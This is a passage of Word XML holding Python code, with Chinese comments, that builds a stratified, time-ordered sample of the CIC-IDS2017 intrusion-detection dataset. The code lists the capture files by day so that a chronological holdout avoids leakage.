          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        raw = {p: target * counts[p][cls] / total for p in counts}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03CBA5B5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        floors = {p: int(np.floor(v)) for p, v in raw.items()}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE0834A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        remain = target - sum(floors.values())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180E0536">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        order = sorted(raw, key=lambda p: raw[p] - floors[p], reverse=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4058EA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for p in order[:remain]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0758F8C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            floors[p] += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F5807F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for p, n in floors.items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09390119">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if n:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="140D84C4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                alloc[p][cls] = n</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D73A117">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return alloc, per_class_total</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41418611">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="25200345">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1D0547D2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def build(files, alloc, seed):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="139D65E5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    rng = np.random.RandomState(seed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29355867">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    chunks = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E52D76D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # __order__ 是全局时间序号：按"天 -&gt; 文件内行号"递增。文件名字母序不等于时间序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="420AC0B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    # （Friday 排在 Monday 前面），所以必须显式给出时间顺序，否则按时间留出会切错。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503EE568">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    cursor = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0D784E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for path in files:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECD92DE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        if not alloc[path]:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ACBC805">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            continue</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="040A7767">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        df = pd.read_csv(path, low_memory=False)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F26CCBE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        df.columns = [str(c).strip() for c in df.columns]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0755E92D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        col = label_column(df)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79E475CA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        canon = df[col].map(normalize_label).map(LABEL_MAP)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CE4ED66">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="03F22E88">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        picked = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727E70E7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        for cls, n in alloc[path].items():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CD69D76">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            idx = np.flatnonzero((canon == cls).to_numpy())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="287C25F4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            if n &gt;= len(idx):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FF01D6D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                picked.append(idx)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A055668">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">            else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03AFC6C9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                picked.append(rng.choice(idx, size=n, replace=False))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0057BCD1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        idx = np.sort(np.concatenate(picked))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27600629">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub = df.iloc[idx].copy()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46117194">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub[col] = canon.iloc[idx]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48FD1565">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 保留来源文件与全局时间序号，供按时间留出的评估使用</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F0C3C1C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # （随机划分会把同一天的近似重复流同时分到训练和测试，指标被抬到 0.999，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="556F8570">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        #   这正是 CIC-IDS2017 被诟病的地方）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AD97CCD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub["__source__"] = path.name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48E95225">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        sub["__order__"] = cursor + idx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8D06F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        cursor += len(df)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41FA3328">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        chunks.append(sub)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512E20A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        print(f"[抽取] {path.name}: {len(sub)} 行", flush=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DBB9DB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5279491F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = pd.concat(chunks, ignore_index=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B9BF8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    out = out.sample(frac=1.0, random_state=seed).reset_index(drop=True)  # 打散行顺序</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC4D9FE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F66D4F2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4E143E15">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E34E28D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def chronological_order():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07E7F1DA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """按时间先后排列的文件名关键字。文件名的字母序不等于时间序。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B41325">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    return [</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BBE0B79">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Monday-WorkingHours",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234011A2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Tuesday-WorkingHours",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="738AD443">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Wednesday-workingHours",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69523A8D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Thursday-WorkingHours-Morning-WebAttacks",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0722BC7A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        "Thursday-WorkingHours-Afternoon-Infilteration",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6108420D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
